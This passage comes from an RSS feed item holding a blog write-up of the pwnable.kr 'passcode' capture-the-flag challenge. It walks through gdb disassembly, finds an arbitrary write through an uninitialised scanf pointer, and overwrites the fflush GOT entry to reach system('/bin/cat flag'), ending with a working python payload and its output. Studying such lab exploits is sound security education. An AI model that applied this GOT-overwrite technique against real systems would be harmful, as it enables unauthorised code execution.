   0x080485aa &amp;lt;+70&amp;gt;:	mov    edx,DWORD PTR [ebp-0xc]
   0x080485ad &amp;lt;+73&amp;gt;:	mov    DWORD PTR [esp+0x4],edx
   0x080485b1 &amp;lt;+77&amp;gt;:	mov    DWORD PTR [esp],eax
   0x080485b4 &amp;lt;+80&amp;gt;:	call   0x80484a0 &amp;lt;__isoc99_scanf@plt&amp;gt;
   0x080485b9 &amp;lt;+85&amp;gt;:	mov    DWORD PTR [esp],0x8048799
   0x080485c0 &amp;lt;+92&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
   0x080485c5 &amp;lt;+97&amp;gt;:	cmp    DWORD PTR [ebp-0x10],0x528e6
   0x080485cc &amp;lt;+104&amp;gt;:	jne    0x80485f1 &amp;lt;login+141&amp;gt;
   0x080485ce &amp;lt;+106&amp;gt;:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x080485d5 &amp;lt;+113&amp;gt;:	jne    0x80485f1 &amp;lt;login+141&amp;gt;
   0x080485d7 &amp;lt;+115&amp;gt;:	mov    DWORD PTR [esp],0x80487a5
   0x080485de &amp;lt;+122&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
   0x080485e3 &amp;lt;+127&amp;gt;:	mov    DWORD PTR [esp],0x80487af
   0x080485ea &amp;lt;+134&amp;gt;:	call   0x8048460 &amp;lt;system@plt&amp;gt;
   0x080485ef &amp;lt;+139&amp;gt;:	leave  
   0x080485f0 &amp;lt;+140&amp;gt;:	ret    
   0x080485f1 &amp;lt;+141&amp;gt;:	mov    DWORD PTR [esp],0x80487bd
   0x080485f8 &amp;lt;+148&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
   0x080485fd &amp;lt;+153&amp;gt;:	mov    DWORD PTR [esp],0x0
   0x08048604 &amp;lt;+160&amp;gt;:	call   0x8048480 &amp;lt;exit@plt&amp;gt;
End of assembler dump.
(gdb) disas welcome
Dump of assembler code for function welcome:
   0x08048609 &amp;lt;+0&amp;gt;:	push   ebp
   0x0804860a &amp;lt;+1&amp;gt;:	mov    ebp,esp
   0x0804860c &amp;lt;+3&amp;gt;:	sub    esp,0x88
   0x08048612 &amp;lt;+9&amp;gt;:	mov    eax,gs:0x14
   0x08048618 &amp;lt;+15&amp;gt;:	mov    DWORD PTR [ebp-0xc],eax
   0x0804861b &amp;lt;+18&amp;gt;:	xor    eax,eax
   0x0804861d &amp;lt;+20&amp;gt;:	mov    eax,0x80487cb
   0x08048622 &amp;lt;+25&amp;gt;:	mov    DWORD PTR [esp],eax
   0x08048625 &amp;lt;+28&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x0804862a &amp;lt;+33&amp;gt;:	mov    eax,0x80487dd

   0x0804863e &amp;lt;+53&amp;gt;:	mov    eax,0x80487e3
   0x08048643 &amp;lt;+58&amp;gt;:	lea    edx,[ebp-0x70]
   0x08048646 &amp;lt;+61&amp;gt;:	mov    DWORD PTR [esp+0x4],edx
   0x0804864a &amp;lt;+65&amp;gt;:	mov    DWORD PTR [esp],eax
   0x0804864d &amp;lt;+68&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x08048652 &amp;lt;+73&amp;gt;:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048655 &amp;lt;+76&amp;gt;:	xor    eax,DWORD PTR gs:0x14
   0x0804865c &amp;lt;+83&amp;gt;:	je     0x8048663 &amp;lt;welcome+90&amp;gt;
---Type &amp;lt;return&amp;gt; to continue, or q &amp;lt;return&amp;gt; to quit---
   0x0804865e &amp;lt;+85&amp;gt;:	call   0x8048440 &amp;lt;__stack_chk_fail@plt&amp;gt;
   0x08048663 &amp;lt;+90&amp;gt;:	leave  
   0x08048664 &amp;lt;+91&amp;gt;:	ret    
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This is the disassembly of two functions that we’re going to mostly work on. We can analyze the &lt;code class=&quot;highlighter-rouge&quot;&gt;welcome()&lt;/code&gt; function that will read username and pass it to the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; variable. From assembly we can view the part of the code that will read the name.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;   0x0804862f &amp;lt;+38&amp;gt;:	lea    edx,[ebp-0x70]
   0x08048632 &amp;lt;+41&amp;gt;:	mov    DWORD PTR [esp+0x4],edx
   0x08048636 &amp;lt;+45&amp;gt;:	mov    DWORD PTR [esp],eax
   0x08048639 &amp;lt;+48&amp;gt;:	call   0x80484a0 &amp;lt;__isoc99_scanf@plt&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here we can see instruction &lt;code class=&quot;highlighter-rouge&quot;&gt;lea&lt;/code&gt; performed on &lt;code class=&quot;highlighter-rouge&quot;&gt;edx&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ebp-0x70&lt;/code&gt;. We can translate it just as load the effective address (calculate it) and store in the &lt;code class=&quot;highlighter-rouge&quot;&gt;edx&lt;/code&gt; register. From that information, we know that variable &lt;code class=&quot;highlighter-rouge&quot;&gt;ebp-0x70&lt;/code&gt; is the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; variable.&lt;/p&gt;

&lt;p&gt;In the next function - &lt;code class=&quot;highlighter-rouge&quot;&gt;welcome()&lt;/code&gt;, we can see the part that will make use of &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; function.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;   0x0804857c &amp;lt;+24&amp;gt;:	mov    edx,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp-0x10]
   0x0804857f &amp;lt;+27&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp+0x4],edx
   0x08048583 &amp;lt;+31&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
   0x08048586 &amp;lt;+34&amp;gt;:	call   0x80484a0 &amp;lt;__isoc99_scanf@plt&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But here, other than in previous example we don’t calculate the address of the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt;, we just use it’s value with &lt;code class=&quot;highlighter-rouge&quot;&gt;mov edx,DWORD PTR [ebp-0x10]&lt;/code&gt;. All the same with &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode2&lt;/code&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;mov edx,DWORD PTR [ebp-0xc]&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So what can we do with this information? After looking for a while, I noticed that the difference between &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; variable is smaller than &lt;code class=&quot;highlighter-rouge&quot;&gt;100&lt;/code&gt;, which is the size of the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;welcome&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;That way we can overwrite value of &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; by entering 96 characters in name, and using last 4 characters as the part for &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt;. In order to demonstrate it, we can set a breakpoint just before the first &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;login()&lt;/code&gt; function.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x08048583
Breakpoint 1 at 0x8048583&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can run the binary, with input consisting of 100 ‘A’ letters.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run
Starting program: /home/passcode/passcode 
Toddler&lt;span class=&quot;s1&quot;&gt;'s Secure Login System 1.0 beta.
enter you name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
(gdb) x/s $ebp-0x10
0xff910158:	&quot;AAAA&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;See? These 4 ‘A’ letters are inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; variable. But as we can’t modify the second variable, we still can’t solve this challenge. Let’s look at the source code once again.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enter passcode1 : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// ha! mommy told me that 32bit is vulnerable to bruteforcing :)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enter passcode2 : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;While looking at this part I’ve noticed a possiblity. As we can control what’s inside the the &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; variable, and the scanf() function that is supposed to write the value into the location at address presentend by the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; variable, we are able to write some value into the any address in the binary. If you don’t understand, let’s break it down into simple steps.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;We are able to enter the value into the &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; by filling the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer.&lt;/li&gt;
  &lt;li&gt;Function &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; will place the value from &lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt; into the location of memory represented by the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Profit.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;But now we have to find a suitable target for this technique. Here comes this very interesting exploit that will overwrite the GOT table of this binary. What is GOT?&lt;/p&gt;

&lt;p&gt;Global Offset Table is a place in which binary stores the addresses of functions, that are unknown at compilation time and is updated at runtime by dynamic linker. Basically, functions like &lt;code class=&quot;highlighter-rouge&quot;&gt;printf()&lt;/code&gt; have their addresses there because they are not static. That’s why dynamic linker will at runtime look for these addresses of these functions, and put them in GOT. If function is used once again, we only have to get the address from the GOT, no need to run dynamic linker twice.&lt;/p&gt;

&lt;p&gt;For more information I encourage you to read these papers, as this is only droplet in the ocean of knowledge:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html&quot;&gt;https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;www.infosecwriters.com/text_resources/pdf/GOT_Hijack.pdf&quot;&gt;www.infosecwriters.com/text_resources/pdf/GOT_Hijack.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now we can write down our full plan for attack. Firstly, we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush()&lt;/code&gt; function as our victim that we can overwrite. Function that will be overwriting will be &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;/bin/cat flag&quot;);&lt;/code&gt;. So we have to find addresses of both of them. Then we will pass to the &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush()&lt;/code&gt; function, by simply fullfilling the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer. After that using the first &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; we will be ready to overwrite the &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush()&lt;/code&gt; function with &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt;. After that all should be ready.&lt;/p&gt;

&lt;p&gt;But firstly, let’s find the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush()&lt;/code&gt;, what we can do with &lt;code class=&quot;highlighter-rouge&quot;&gt;objudmp -R&lt;/code&gt; command.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;-R
--dynamic-reloc
Print the dynamic relocation entries of the file.  This is only
meaningful for dynamic objects, such as certain types of shared
libraries.  As for -r, if used with -d or -D, the relocations are
printed interspersed with the disassembly.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;passcode@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; passcode
passcode:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a02c R_386_COPY        stdin@@GLIBC_2.0
0804a000 R_386_JUMP_SLOT   &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@GLIBC_2.0
0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   __gmon_start__
0804a018 R_386_JUMP_SLOT   &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;See? Here we have it &lt;code class=&quot;highlighter-rouge&quot;&gt;0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now from the previous disassembly, we cavn view the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; function.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;   0x080485e3 &amp;lt;+127&amp;gt;:	mov    DWORD PTR [esp],0x80487af
   0x080485ea &amp;lt;+134&amp;gt;:	call   0x8048460 &amp;lt;system@plt&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And we’re ready to craft the payload - 96 ‘A’ letters, address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush()&lt;/code&gt; function and to satisfy the &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; - address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; function.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;passcode@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print('A' * 96 + '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08' + '134514147')&quot;&lt;/span&gt; | ./passcode
Toddler&lt;span class=&quot;s1&quot;&gt;'s Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
</description>
        <pubDate>Fri, 29 Jun 2018 02:00:00 +0200</pubDate>
        <link>http://localhost:4000/pwnable.kr-passcode/</link>
        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-passcode/</guid>
      </item>
    
  </channel>
</rss>
